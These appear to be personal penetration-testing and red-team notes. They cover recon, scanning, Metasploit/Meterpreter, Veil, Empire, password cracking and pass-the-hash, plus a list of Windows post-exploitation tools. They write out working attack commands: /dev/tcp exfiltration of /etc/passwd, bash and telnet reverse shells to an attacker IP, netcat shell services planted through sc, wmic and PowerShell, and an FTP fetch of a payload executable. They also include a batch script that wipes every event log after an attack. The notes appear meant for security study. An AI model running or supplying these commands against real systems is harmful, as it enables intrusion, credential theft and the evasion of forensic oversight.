# Notes, red-team materials, testing, etc.

# Set-ExecutionPolicy Unrestricted

### First things first.  Set up cowsay and lolcat
    requires pip3 & cowsay
    while true; clear; do echo "I'm a cow" | cowsay -f $(ls /usr/share/cowsay/cows/ | sort -R | head -n1) "I'm a cow" | lolcat -a; sleep 5; clear; done

### Neat things you can do with tcpdump
https://www.middlewareinventory.com/blog/tcpdump-capture-http-get-post-requests-apache-weblogic-websphere/

### Netcat without netcat
Check for existence of similar tools:
Gnu Netcat
Ncat
Socat
Linkcat
Nc.py (sometimes called Pycat) http://atlas.r4780y.com/resources/atlasutils-2.2.5.tgz

#### /dev/tcp
File transfers:
Box 1: # nc -nlvp 4444
Box 2: $ cat /etc/passwd > /dev/tcp/10.0.0.1/4444

Reverse shell:
Box 1: # nc -nlvp 8080
Box 2: $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

Port scanner ("Connection refused" means port is closed):
Single port:    $ echo > /dev/tcp/10.0.0.1/22
Multiple ports: $ port=1; while \[ $port –lt 1024 ]; do echo > /dev/tcp/\[IPaddr]/$port; \[ $? == 0 ] && echo $port "is open" >> /tmp/ports.txt; port=`expr $port + 1`; done

#### If /dev/tcp can't be used, try telnet
Reverse shell:
Box 1 (where you type commands):   # nc -nlvp 4444
Box 1 (where you view the output): # nc -nlvp 4445
Box 2: $ telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4445

### Powershell
Ping sweep:
    PS C:\> 1..255 | % {ping –n 1 10.10.10.$_ | sls ttl}
    1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | select-string ttl}
Port scan:
    21..80 | % {echo $_; echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.1",$_)) “Port $_ is open" } 2>$null


# Introduction

Free / Public Pen test methodologies
1.	OSSTMM (Open Source Security Testing Methodology Manual) by Pete Herzog, focus on transparency
2.	PTES (Pen Test Execution Standard) by Chris Nickerson (fully in-depth pen test)
3.	NIST Guideline on Network Security Testing 800-53A and SP800-115 (PDF) (15 to 20 pages, not deep)
4.	OWASP Testing security guide (Web App specific)
5.	Penetration Testing Framework (www.vulnerabilityassessment.co.uk/Penetration%20Test.html) by Toggmeister & Lee Lawson (deep with specific tools and commands, step-by-step, sections on VOIP, AS/400, Bluetooth, WLAN, Cisco)

# Reconnaissance
Info extraction from document metadata (usernames, file systems paths, emails, geo-coordinates, etc.):
•	exiftool <filename> (runs on win, linux, mac) or FOCA or NLNZ or
•	strings -n 8 -e b <filename> (built into Linux, not on win but downloadable from sysinternals)
Whois lookups: Tell the public IPv4 or v6 ranges assigned to that domain
ARIN lookup: Can do advanced search for network, name or domain, based on geography
DNS analysis
•	NS, A, AAAA, HINFO, MX, TXT, CNAME, SOA, RP, PTR, SRV
•	nslookup, dig 
•	recong-ng (--no-check parameter for not looking for latest updates)
o	PTR record  used for reverse domain lookup (given an IP, find the hostname)
Google Hacking for known vulnerabilities and other info
•	SearchDiggity tool has GUI for vulnerability search online for target domains / sites (Bishop fox company)
Recon-ng (needs apikey from search engines to perform online search) (Tim Tomes) (Python based)
•	Multiple modules (discovery, exploitation, import, reporting, recon)
                      Recon modules: Companies, Contacts, Credentials, Domains, Hosts, Locations, Netblocks, Ports, Profiles
Reconnaissance steps:
•	Network sweeps (live hosts) | Network tracking (topology/hops) | Port scan | OS fingerprinting | Version scan | Vulnerability scan

Scan tips:
•	Use IP (not domain names, except for websites)
Dealing with large scans:
1.	Sampling subset of target machines (around 10%, every quarter on different sample)
2.	Sampling target ports (perhaps 1000 most popular, default nmap behavior)
3.	Reviewing network firewall ruleset and test only ports that could pass through firewall
4.	Altering firewall rules to send resets / icmp port unreachable message for closed ports (not recommended)
5.	Using hyperfast packing sending methods (high perf PCs, lowering timeouts, move close to targets) DoS !
A combo of 1 and 3 is a solid approach

Sniffers (tcpdump  fast, flexible and small (free/open-source))  need root privileges  this language is BPF
•	-n, -nn : Use numbers instead of host names, use numbers for host and service names
•	-i Interface | -v verbose | -X ASCII and Hex | -s snap length | -w write | -x hex | -A ASCII
•	tcpdump -nn host <ip> and net <first 3 octets of subnet> not port <port-number>
o	host parameter means both src and dst combined
•	tcpdump -nn host <ip> and portrange <startport-endport>
•	tcpdump <protocol> (e.g. ether, arp, rarp, ip, ip6, tcp, udp, http, etc.)
•	-s0 means setting snap length to 0, thereby showing entire packet content in tcpdump

Tracing:
Ipv4: TTL  number of hops to live before getting discarded (linux/unix has initial TTL as 64; Win has initial TTL as 128)
Ipv6: Hop Limit  8 bit long, max 255. Same as TTL. We can traceroute with this.
Traceroute on linux uses UDP packets (from 33434 port) 
•	-f [set initial TTL of packet] | -g [source route] | -I [use ICMP instead of UDP] | -T (use TCP SYN instead of UDP, with default dst port 80) | -m [set max number of hops] | 
•	-n [print number instead of names] (else queries DNS records for name) (don’t use this, we need router info)
•	-p [use of custom port like 443]
•	-w [Wait time for N seconds before giving up and printing *] default: 5 seconds
•	-4 (force use of IPv4) | -6 (force use of IPv6)
Tracert on windows uses ICMP echo requests
•	-h [max number of hops] default is 30
•	-d (don’t resolve names)
•	-j [hostlist] comma separated source IPs (up to 9 max)
•	-w [wait for N milliseconds before printing *] default 4000
•	-4 (force use of IPv4) | -6 (force use of IPv6)
Web based traceroutes: www.traceroute.org | www.kloth.net/services/traceroute.php (different country servers)

Nmap (written & maintained by Fyodor and his team) Port scan:
•	TCP control bits: CWR | ECE | URG | ACK | PSH | RST | SYN | FIN
•	In TCP, if response is ‘ICMP port unreachable’, it means, port is filtered. In UDP, it means, port is closed.
•	Reports as ‘open|filtered’ when UDP port request is sent but has no response
•	--reason at the end of nmap command will tell us actual reason for port scan status (filtered case)
•	--badsum will send packets with bad checksum (to confirm that deny is from firewall or from target system)
•	--packet-trace (details of each packet sends or receives)
•	--version-trace (details of version probes)
•	script.db has list of usable NSE scripts information (map script with category)
•	Service version scan is done using the ‘probe file’ (/share/nmap/nmap-service-probes) (has “Probe” lines and “match” lines)
•	Runtime with nmap: (p=turn on trace) (v=increase verbosity) (d=increase debug) shift+letter to decrease
•	If target on same subnet and running as root, just sends ARP request. If on diff subnet, sends ICMP echo req
•	As non-root user, nmap makes 3-way (SYN to port 80 and 443, if no response, host is down) no icmp here
•	-A = -O (heuristics analysis) + -sV + -sC + --traceroute

Scapy: Packet crafting (Create, Modify, Send, SendReceive, Sniff, etc.) (By Philippe Biondi, runs in Python)
•	packet = sr(IP(dst=”ip”)/TCP())    [Default src port is 20 and default dst port is 80]
•	send(IP(src=”ip”, dst=”ip”)/TCP(sport=80,dport=80, flags=”AR”), count=4)
o	Land attack when src-ip and dst-ip are same and sport and dport are same
•	>>> python prompt; CTRL+D to exit from scapy
•	arpcachepoison can make scapy be used as MITM as long as we don’t quit from the command
•	ans, unans=_ (underscore refers to the last thing we did)

# Vulnerability scanning
## Vulnerability scanners
•	nmap NSE with vuln scripts | Nessus | Nexpose | OpenVAS | SAINT | Retina NSS | Core Impact | Qualys

Mallory  A MITM tool for TCP/UDP/HTTP protocols (https://github.com/intrepidusgroup/mallory)

Exploitation
Types: Service side exploit | Client-side exploit | Local privilege escalation (normally not rated critical by most vendors of client-side software. Attack possible via Meterpreter’s getsystem, Enlightenment Exploit, Empire); 

Types of privilege escalation:
•	Race condition | Attacking kernel | Local exploit of high privileges programs or services (For Win, Meterpreter and For Linux, Enlightenment exploit)

Metasploit (written in ruby) (by H.D. Moore)
•	msfd runs on 55554 port (no authn or encryption) and msfrpcd runs on 55553 port (SSL possible)
•	(Java based) Armitage internally calls msfrpcd to communicate with Metasploit
•	Modules: auxiliary, encoders, exploits (OS specific, multi handler, browser), nops, payloads, post
•	/modules/payloads/singles  stand-along payloads (functionality + communication) (small by ½ to 1/20)
•	/modules/payloads/stagers  Piece that first loads into memory and later allows stage to communicate with attacker
o	bind_tcp (listen on tcp) | bind_ipv6_tcp | reverse_tcp | reverse_ipv6_tcp | reverse_http | reverse_https | reverse_tcp_allports
•	/modules/payloads/stages  actual payload content for functionality such as remote shell, etc.
o	dllinject | upexec | shell (x86, x64) | vncinject (x86, x64) | meterpreter (x86, x64)
•	Create malicious EXE / SH file to run on target machines to give us shell access, we use msfvenom (veil-evasion is used for same purpose, is better than msfvenom as msfvenom payloads could be detected by AV)
    Output from msfvenom can be encoded using msfencode to evade strict signatures of some IDS/IPS/Antivirus tools
•	(postgresql) db_connect, db_disconnect, db_driver, db_status, db_import, db_export, db_nmap
o	hosts, services, vulns, creds, loot, notes

## Meterpreter
•	Available for windows, Linux, PHP, Java environments
•	Meterpreter runs on existing process, doesn’t create a new process (directly loads raw DLL into memory without touching file system, this DLL doesn’t display on tasklist /m command that shows DLLs per process) 
•	Commands: cd, lcd, pwd /getwd, ls, cat, download / upload, mkdir / rmdir, edit
•	getpid, getuid, ps, kill, execute, migrate
•	route command on meterpreter changes iptables, where route on Metasploit does pivoting. Use portfwd for pivoting with Meterpreter
o	portfwd add -l 1111 -p 22 -r <target2-ip>   (runs without root privileges)
o	This will let attacker PC communicate with local port 1111 (on attacker PC) and forward commands to target2-ip (on specified port, 22 in this case) via compromised target1 meterpreter session
•	Can be used for key loggers, webcams, etc. from target victim machine
o	keyscan_start and keyscan_dump and keyscan_stop
o	webcam_list (lists installed webcams)
o	webcam_snap (snaps a single frame from webcam as JPEG file) default quality: 50 (1 to 100)
o	record_mic -d N (records audio for N seconds and stores as WAV file in .msf4 directory
•	use priv (and then run: hashdump, getsystem, timestomp)
•	msfmap (not part of default Metasploit, to be downloaded and installed, does port scanning like nmap)
o	SecureState’s, msfmap, does port scanning from compromised machine via meterpreter payload
•	keyscan_start, keyscan_stop, keyscan_dump commands on meterpeter prompt will provide key strokes
•	clearev command will clear logs on target machine (system, application, error logs)
•	hashdump command dumps from Win memory (LSASS) and run hashdump script pulls from registry (safe)
•	load kiwi (loads kiwi) & creds_all command will show cleartext password of dumped user password hashes from win memory (LSASS)

## Veil-Evasion (Framework)
•	Creates vulnerable software to install on victim’s PC that is not generally detected by antivirus
•	Methods: Shutdown AV, Ghost Writing, Encoding, Loading malware into memory with touching filesystem, Custom compilation
•	Veil-Framework: Veil-Evasion (create payload), Veil-Catapult (run payload if psexec fails), Veil-Pillage (post-exploit module for creds, disable UAC, enable RDP, etc.), Veil-PowerUp (PowerShell for privilege escalation)
•	./Veil-Evasion.py (creates a resources configuration file for Metasploit to run it (.rc))
o	Has payloads split by programming language (C, C#, Python, Ruby, etc.)
o	Releases new ways to bypass AV tools every 15 days in the past, but seldom now
o	Has stage, which is meterpreter or shell and has stager, communication channel like reverse_tcp
o	“clean” command will delete earlier created files under /usr/share/veil-output/ folder
o	‘ExitOnSession’ will be set of false, when using Veil-evasion’s Metasploit configuration file (*.rc). This value is by default set to ‘true’ in Metasploit

# Post Exploitation
Netcat (& relay):
•	Transferring files to and from server & client. Also for pivoting (compromised host as pivot to other systems)
•	Command for “Service is up”:
while `nc -vv -z -w3 ip port > /dev/null` ; do “Service is ok”; sleep 1; done; while (true); echo -e “\x07”; done
•	Instead of netcat, getting shell on victim machine is possible using command injection on GUI
/bin/bash -i > /dev/tcp/attacker-ip/attacker-port 0<&1
•	mknod backpipe p (p is to create FIFO, p refers to ‘named pipe’) (backpipe is a name that we give to this)
•	nc -l -p <target1-port> 0<backpipe | <target2-ip> 22 1>backpipe
o	To login from attacker pc: putty.exe <target1-ip> <target1-port> (enter target2’s user/pass to login)
o	this will help to bypass firewall that blocks port 22 in iptables
•	0 refers to standard input; 1 refers to standard output; 2 refers to standard error;

Empire (Post-exploitation framework, based on PowerShell) (By Will Scheroeder, Justin Warner, Matt Nelson)
•	Consists of controlling server, called listener (written in Python) and agent clients (written in PowerShell)
•	Mix of tools: PowerSploit (Matt Graeber, Chris Campbell, Joseph Bialek) + Posh-SecMod (Carlos Perez) + UnmanagedPowerShell (Lee Christiansen) + PowerShell-AD-Recon (Sean Metcalf)
•	Inbuilt PowerShell frameworks (ps1 files): PowerBreach (Persistence) | Posh-ModSec (Discovery, network situation info) | PowerSploit (code execution, screenshots, keystokes, logging) | PowerUp (priv escalation) | PowerView (Acct info, Domain info)
•	Provides ‘Not Opsec Safe’ reminders before running the stagger
•	Uses PowerShell but doesn’t require powershell.exe on target windows
•	Renames exploited sessions for easier tracking
•	Set killdates for the agents on compromised machines (and set working hours for agents)
•	Automatically configure agents, ready for deployment and callback
•	Can run a BypassUAC attack for Windows, not to pop-up the window for high privilege commands
•	Encrypts the traffic using StaggingKey (which is an md5 hash of providing value on command line)
•	Module categories: Code execution, Collection, Exfiltration (PII data as test for blue team), Exploitation (Jboss, Jenkins), Fun, Lateral movement (psexec another target, ssh), Management (email, RunAs, alter file system, inject hashes into local security authority sub-system (LSASS)), Persistence (reg key, task scheduler), Recon (sweeps), Situation awareness (ARP / SMB scan, Reverse DNS lookup, Domain info), Trollsploit (play ascii video and audio, rick roll – ‘never gonna give you up’)
•	usestager is the command to create agents / vulnerable executables onto target machines

Different ways to move files from attacker PC to target system (or vice-versa):
•	TFTP, FTP, SCP, HTTP(s), Windows file sharing, NFS (TCP 2049), Netcat, meterpreter upload / download / cat / edit, Script based command line append >> file.txt

## Windows command line scripting
•	while (true) ; do [this] && [this] ; [this] ; done
•	> /dev/null means throw away
•	control /name Microsoft.WindowsDefender (command that disables windows defender)
•	control /name Microsoft.ActionCenter (command that opens up action center on windows)
•	net use M: \\ip\share <password> /u:<user>   creates SMB session and mount it on M drive
o	net use \\ip /del OR net use * /del /y    (to delete all connections without prompting yes/no)
•	runas /u:<user> <command>

Using compromised target-1 windows machine to run commands into another windows machine
•	Use of psexec from Microsoft sysinternals (by Mark Russinovich, creates psexec service on first run and -d option lets it to run in disconnected mode without waiting for standard i/p and o/p) OR Inbuilt Metasploit’s psexec exploit OR NMap’s NSE script for psexec
•	Use of ‘at’ or ‘schtasks’ command  to invoke an executable (scheduling jobs, checking status, etc.)
o	at \\target-ip [HH:mm:ss] [A|P] [command]
        schtasks /create /tn [taskname] /s [targetip] /u [user] /p [pass] /sc [frequency] /st [starttime] /sd [startdata] /tr [command]
  To run with system user: replace user and pass with “/ru SYSTEM”

SC (Service Controller) on Windows
•	Use ‘sc’ command (starting a service with sc command will always run with SYSTEM privileges but run only for 30 seconds. After that time, system will kill it as there is no API call back that service started successfully)
o	To tackle the 30 sec issue with sc command, InGuardian’s ‘ServifyThis’ tool helps as wrapper to call  the service started API call back OR run command as ‘cmd.exe /k’ in sc [/k refers to child process]
     sc \\<victim_host_name> create <service_name> binpath= “cmd.exe /k nc.exe -l -p 1234 -e cmd.exe”
•	sc query state= all  (space between equal-to(=) and all)
•	To create service on victim machine
o	sc \\<victim_host_name> create <service_name> binpath= “nc.exe -l -p -e cmd.exe”
•	To query or start or stop or delete the service from attacker machine
o	sc \\<victim_host_name> query|start|stop|delete <service_name>
o	Don’t use IP address in above commands, windows has problems. Works only with hostname.
•	‘sc’ doesn’t have access to open GUI of target-pcs, whereas ‘wmic’ can !

## wmic (Windows Management Instrumentation command-line)  uses WQL for query and update
•	Use of ‘wmic’, which is more flexible (available from XP pro to Win 10, can manage Win 2000 or later)
o	wmic /node:<targetip> /user:admin /password:cvratnam process call create <command>
	Leaving out user and pass in above command is a ‘pass-the-hash’ attack by default
o	wmic /node:@targets.txt process list brief     or process list full
•	wmic service where (displayname like “%whatever%”) get name  gives service name, not display name
•	To create service on victim machine: wmic process call create “nc.exe -l -p 12345 -e cmd.exe”
•	To delete the process: wmic process where name=”nc.exe” delete

## PowerShell
•	Built-in from Win7 and Win2k8 R2; Successor to cmd.exe, cscript, command.com
•	Can be used to create windows services and start|stop them
o	For deleting the created windows service, we can rely on sc or wmic
•	Where-Object alias is “?” (Example: Get-Service | ? {$_.status -eq “running”} will display running services)
•	Select-Object alias is “select” (Example: Get-Service | select Name)
•	ls -r c:\users | % {select-string -path $_ -pattern password} 2>$null
•	Instead of objects being piped, if we want text-stream, we can use ‘Out-Host’ commandlet.
o	ls -r C:\Users\user | Out-Host -paging
•	New-Service -name nc -BinaryPathName “cmd.exe /k c:\nc.exe -l -p 3333 -e cmd.exe” -StartupType manual
o	Start-Service netcat1
o	sc.exe delete netcat1

# Password Attacks
•	Passwords are huge part of pen testing and ethical hacking arsenal
•	Password guessing: Could be slower than password cracking (depends on network and system perf)
•	Password cracking
o	Stealing encrypted / hashed passwords and guessing/decrypting on attacker’s own methods
o	Stealthier than password guessing
o	Doesn’t lock out accounts
•	Windows LANMAN passwords are uppercase after cracked; 2n possibilities for actual password after cracking; Script tool called lm2ntcrack can try all combinations to test (Ruby script on Metasploit also can)
•	Password wordlist to be used for guessing: https://wiki.skullsecurity.org/Passwords (by Ron Bowes)
•	CeWL (www.digininja.org) can be used to generate password list based on context of words from websites
•	Interesting files to look for, after successful exploitation: 
o	Linux: /etc/passwd and /etc/shadow
o	Windows: SAM file
o	Active directory: ntds.dit
o	John the ripper's john.pot file
•	‘net accounts’ command on windows will display policy info regarding password management
•	‘wmic useraccount list brief’ command on windows displays accounts and SID value of each user (admin as 500 as SID and guest has 501 as SID and all user created accounts begin from 1000 SID)
•	grep tally /etc/pam.d/* command on linux displays whether account lock out is place or not
•	Kon-boot alters the kernel of windows and some linux, gives access as admin without a password (to be used in case of only admin account locked out or forgot password)
•	Microsoft’s LockoutStatus.exe tool pulls info about locked accounts from Active Directory; ALodkcout.dll tool records list of apps that are locking out accounts (useful for troubleshooting and to clear attacker traces)
•	By default, windows administrator account cannot be locked out. This can be changed on local PC using passprop.exe and on Active directory configuration as well
o	If locked out Win’s admin account, use Peter Nordahl’s tool http://pogostick.net/~pnh/ntpasswd/ 
o	If locked out Linux root, boot to Linux rescue, mount and reset using faillog -r -u <loginname>
o	OR use Kon-boot, alters Win and Linux kernel, load into memory, gain access without password
	http://www.piotrbania.com/all/kon-boot/ 
•	On Linux/Unix, account lock out is in place using PAM or custom package; Check for lockout by:
o	grep tally /etc/pam.d/*
o	grep tally /etc/pam.conf (by default root account cannot be locked, unless it is set in pam.conf)

## THC-Hydra (van Hauser):
•	Password guessing tool based on wordlist. Just type ‘hydra’ or ‘xhydra’ for running it as GUI
•	-l : lowercase; -u: Uppercase; -n: Numbers; -p: Printable chars not in lower/upper/num; -s: Special chars
o	cat /tmp/passwords.txt | pw_inspector -m 6 -n -u -l -c 2 > /tmp/passwords1.txt
•	Includes pw-inspector for trimming the list based on password policy

LANMAN Hash: Break into 7-character pieces, then use each as DES key onto constant: KGS!@#$%

NT Hash: MD4 hash of full user’s password (up to 256 characters long). No salt is used during the hash process

LANMAN client-server: Break into 7-character pieces, then use each as DE
S key on the challenge and finally combine
NTLMv1 client -server: Same as LANMAN client-server auth, but starts with NT hash (MD4)
NTLMv2 client-server authentication:
•	Server pseudo-random challenge and client pseudo-random challenge
•	NTLMv2 OWF = HMAC-MD5 (username + domain) with NT hash as key
•	Client response = HMAC-MD5 (server challenge + timestamp + client challenge + other) using NTLMv2 OWF
Pass-the-hash works with LANMAN, NT, LANMAN client-server, NTLMv1, NTLMv2 protocols.

## Linux/Unix user password storage
•	In /etc/shadow, passwords that start with:
o	$1$  MD5 hash of password with salt
o	_  BSDi Extended DES
o	$2$ or $2a$  blowfish based
o	$5$  SHA256 hash of password with salt
o	$6$  SHA512 hash of password with salt
o	In /etc/passwd, if there is ‘x’, ‘*’, ‘!!’, indicates that password is not present for that user
•	/etc/passwd has user info (like gecos field like user real name or phone numbers)

## Windows user password storage and retrieval
	Sniff challenge / response of NTLM v1, v2, Kerberos
	Stored in SAM file in c:\windows\system32\config (not seen after user logged in)
	Use mimikatz tool to dump cleartext password from windows memory
o	On meterpreter prompt: “load kiwi” and “creds_all” will provide clear text passwords of users
	Tool for extracting user password hashes from Microsoft Active Directory's ntds.dit file is https://github.com/csababarta/ntdsxtract 
VSS (Volume Shadow Copy) (Tim Tomes and Mark Baggett) to retrieve ntds.dit from Domain Controller  better than dump from memory
	cscript vssown.vbs /status  (OR /start  OR /create /c  OR /stop)

## John the Ripper (Solar Designer) http://www.openwall.com/john  (has instable “Jumbo patch”)
	unshadow script will combine /etc/passwd and /etc/shadow into single file suitable for cracking by the tool
	john.conf in linux and john.ini in windows
o	Crack modes: Single, Wordlist, Incremental, External (own C code)
	john.pot file stores cracked passwords (hash + cleartext) under ‘run’ directory (no usernames)
o	./john --show <original-hash-file> (to know what passwords are already cracked)
	john.rec file stores current run status. This file is used during crash recovery. Is undocumented on-purpose
o	./john --restore to recover from crash
	To know the status of run (press any key): John displays:
o	Number of guessed passwords so far, Time of scan, percentage of completion, combinations per sec, Range of passwords trying so far
	./john --test will give speed of a given system in cracking password hash routines that john can handle
o	Compiling with SSE2 makes is much faster
	Support distributed cracking via OpenMP (Open Multi Processing) API and MPT (Message Passing Interface)
	GPU-based password cracking (rely on CUDA) is much faster (10 to 50 times) than CPUs 
	./unshadow   passwd_copy   shadow_copy  >  combined.txt

## Hashcat: Multi-threaded tool for CPUs (18million c/s) and GPUs (1billion c/s); Available for Win and Linux
	Uses OCL (Open computing language), uses both GPU and CPU password cracking; Uses NVIDIA / ATI cards

## Cain: (Windows tool) (by Massimiliano Montoro) www.oxid.it 
•	Apart from password cracking, Cain can do traceroute, whois, sniffing, etc.
•	Cain sniffer can automatically extract passwords or hashes from specific protocols (FTP, Telnet, HTTP, IMAP, POP3, VNC, RDP, MS SQL, MySQL, SIP/RTP, HTTPS, SSHv1)
o	VoIP based sniffing needs decoders that work either in Cain or in Wireshark
•	Cain’s ARP-poisoning can be used as MITM
•	Needs wordlists.txt file to load into GUI to crack passwords, else have to brute-force with combinations

## Rainbow tables: (Time-Memory trade off)
•	We need: 1. Hashes   2. Rainbow tables   3. Lookup table that works with our tables
•	Called rainbow tables due to various colors used on reduction functions but they are just functions only
•	Storage:
o	Doesn’t store all hashes and passwords. Instead stores info about ‘chains’ from which hashes and passwords can be derived on the fly
o	Clear text password - hash - Reduction function - Iterate or repeat the process around 10,000 times.
o	Finally store original clear text password and final generated password as ‘mapping’ in rainbow table DB
•	Lookup or retrieval: Two phase: (one to find end-password, then to start over from initial-password)
o	Start with unsalted hash to crack - Reduction function - iterate until final password matches end password in above chains
o	Take the initial password in identified chain and re-apply entire hash + reduction function until hash matches. This step is faster than the above step (happens in CPU or reg). Once matched, the password that generated the hash is the cracked password
•	Generating rainbow tables by our own
o	Rtgen tool from project rainbow crack OR Ophcrack (by Philippe Oechslin) has precomp tool

## Pass the hash:
•	WCE (Windows credential editor) tool (by Hernan Ochoa) for 'pass-the-hash' on windows admin user account (RID 500) (remotely without the need to crack the password hash)  https://www.ampliasecurity.com/research/windows-credentials-editor/ 
o	Can grab and inject LANMAN, NT hash and also with recent versions of WCE, we can inject Kerberos tickets into memory
o	-l (list hashes); -s (inject hashes); -d (remove injected hashes); -K (list Kerberos tokens), -k (inject Kerberos tokens)
•	Meterpreter has inbuilt ‘pass-the-hash’ ability on PSEXEC
o	Instead of cleartext password, admin user ‘password hash’ in [LANMAN]:[NT] format can be used

# General info on password hacking
•	When no access to password hashes, try password guessing like Hydra or sniffing cleartext or challenge/response with Cain or tcpdump
•	If we have salted hash from Linux / Unix, use John the ripper (password cracking)
•	If we have LANMAN or NT hash from Windows, use Rainbow tables (Ophcrack), followed by John or Cain
•	If we have LANMAN challenge/response, NTLMv1 and v2 captures, use use cracking with Cain
•	If we have Windows LANMAN or NT Hash and SMB access, try ‘pass-the-hash’ method (WCE, Meterpreter, nmap’s NSE script for SMB, etc.)

# Awesome Windows Post Exploitation 

## Contents

* [Powershell](#powershell)
* [Privilege Escalation Tools](#privilege-escalation-tools)
* [Privilege Escalation Guides/Wiki](#privilege-escalation-guides/wiki)
* [Post Exploitation Tools](#post-exploitation-tools)
* [Post Exploitation Guides/Wiki](#post-exploitation-guides/wiki)
* [Post Exploitation Techniques and Commands](#post-exploitation-techniques-and-commands) *Some of the commands listed are redundant.

## PowerShell

* [BloodHound](https://github.com/adaptivethreat/BloodHound) - Six Degrees of Domain Admin
* [Empire](https://github.com/adaptivethreat/Empire) - Empire is a PowerShell and Python post-exploitation agent
* [Generate-Macro](https://github.com/enigma0x3/Generate-Macro) - Powershell script will generate a malicious Microsoft Office document with a specified payload and persistence method
* [Old-Powershell-payload-Excel-Delivery](https://github.com/enigma0x3/Old-Powershell-payload-Excel-Delivery) - This version touches disk for registry persistence
* [PSRecon](https://github.com/gfoss/PSRecon) - PSRecon gathers data from a remote Windows host using PowerShell (v2 or later), organizes the data into folders, hashes all extracted data, hashes PowerShell and various system properties, and sends the data off to the security team
* [PowerShell-Suite](https://github.com/FuzzySecurity/PowerShell-Suite) - Some useful scripts in powershell
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - A PowerShell Post-Exploitation Framework
* [PowerTools](https://github.com/PowerShellEmpire/PowerTools) - A collection of PowerShell projects with a focus on offensive operations
* [Powershell-C2](https://github.com/enigma0x3/Powershell-C2) - A PowerShell script to maintain persistance on a Windows machine
* [Powershell-Payload-Excel-Delivery](https://github.com/enigma0x3/Powershell-Payload-Excel-Delivery) - Uses Invoke-Shellcode to execute a payload and persist on the system
* [mimikittenz](https://github.com/putterpanda/mimikittenz) - A post-exploitation powershell tool for extracting juicy info from memory.
* [Empire](https://github.com/gold1029/Empire) - Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.

## Privilege Escalation Tools

* [Potato](https://github.com/foxglovesec/Potato) - Privilege Escalation on Windows 7,8,10, Server 2008, Server 2012
* [Windows Privilege Excalation](https://github.com/AusJock/Privilege-Escalation/tree/master/Windows) - Contains common local exploits and enumeration scripts
* [Pentest Monkey Windows Privilege Escalation](http://pentestmonkey.net/uncategorized/from-local-admin-to-domain-admin) - Post-Exploitation in Windows: From Local Admin To Domain Admin (efficiently)
* [Incognito](https://github.com/fdiskyou/incognito2) - Privilege Escalation Tool

## Privilege Escalation Guides

* [Windows Privilege Escalation](http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation) - Windows Post-exploitation Wiki
* [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html) - Fundamentals of Windows Privilege Escalation
* [Security Implications of Windows Access Tokens- A Penetration Tester's Guide](https://www.exploit-db.com/docs/english/13054-security-implications-of-windows-access-tokens.pdf) 


## Post Exploitation Tools

* [mimikatz](https://github.com/gentilkiwi/mimikatz) - A little tool to play with Windows security - extract plaintexts passwords, hash, PIN code and kerberos tickets from memory.
* [Pazuzu](https://github.com/BorjaMerino/Pazuzu) - Reflective DLL to run binaries from memory
* [UACME](https://github.com/hfiref0x/UACME) - Defeating Windows User Account Control
* [Pupy](https://github.com/n1nj4sec/pupy) - Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python.
* [Veil Pillage](https://github.com/Veil-Framework/Veil-Pillage) - Veil-Pillage is a post-exploitation framework that integrates with Veil-Evasion.
* [Intersect](https://github.com/deadbits/Intersect-2.5) - Post exploitation framework.
* [Koadic](https://github.com/zerosum0x0/koadic) - Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire.
* [Invoke-AltDSBackdoor](https://github.com/enigma0x3/Invoke-AltDSBackdoor) - This script will obtain persistence on a Windows 7+ machine under both Standard and Administrative accounts by using two Alternate Data Streams
* [hackarmoury](http://hackarmoury.com) - Upload common tools from shell of compromised machine via FTP and other protocols.   
* [Invoke-LoginPrompt](https://github.com/enigma0x3/Invoke-LoginPrompt) - Invokes a Windows Security Login Prompt and outputs the clear text password

## Post Exploitation Guides/Wikis

* [Post Exploitation Wiki](https://github.com/mubix/post-exploitation-wiki) - Post exploitation wiki.
* [Privlege escalation with Incognito](http://hardsec.net/post-exploitation-with-incognito/?lang=enPE%20with%20Incognito%C2%A0PE%20with%20Incognito) - How to use Incognito for Privilege Escalation in Windows
* [Pwning Windows Domains from the Command Line](https://crowdshield.com/blog.php?name=pwning-windows-domains-from-the-command-line) - Several tools and techniques that can be used in order to compromise an entire Active Directory domain completely from the command line.
* [Windows Post Exploitation Checklist](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
* [pwnwiki](http://pwnwiki.io) - Post Exploitation Wiki (Multi-Platform)
* [Windows Domain: Pivot and Profit](http://www.fuzzysecurity.com/tutorials/25.html) - Techniques to move laterally when compromising a Windows machine.

## Post-exploitation Techniques and Commands

* [Useful Commands for Windows Administrators](http://www.robvanderwoude.com/ntadmincommands.php) - Post-exploitation techniques and commands to elicit information from shell of compromised windows machine.
* [A-Z List of Windows Shell Commands](https://ss64.com/nt/) - A-Z Listing of all Windows CMD Commands
* [Red Team Field Manual](https://github.com/Agahlot/RTFM/blob/master/rtfm-red-team-field-manual.pdf) - Windows Post-Exploitation techniques and commands.

### Clear Log Files
A simple script to clear logs post attack.

**Create a batch file and execute it as admin.**

  @echo off
  FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
  IF (%adminTest%)==(Access) goto noAdmin
  for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
  echo.
  echo goto theEnd
  :do_clear
  echo clearing %1
  wevtutil.exe cl %1
  goto :eof
  :noAdmin
  exit
  
### Transfer files to compromised host via non-interactive shell 

In cases where you want to upload a file onto the compromised machine but you don't have an interactive shell where you simply upload the file, you can write it onto the compromised machine using FTP, feeding it one line at a time.  

**Create a blank file to write commands onto**
ftp -s:ftp_commands.txt

**Echo each command (you can also do this all in one line):**

echo open 10.9.122.8>ftp_commands.txt
echo anonymous>ftp_commands.txt
echo blah>ftp_commands.txt
echo binary>ftp_commands.txt
echo get met8888.exe>ftp_commands.txt
echo bye>ftp_commands.txt

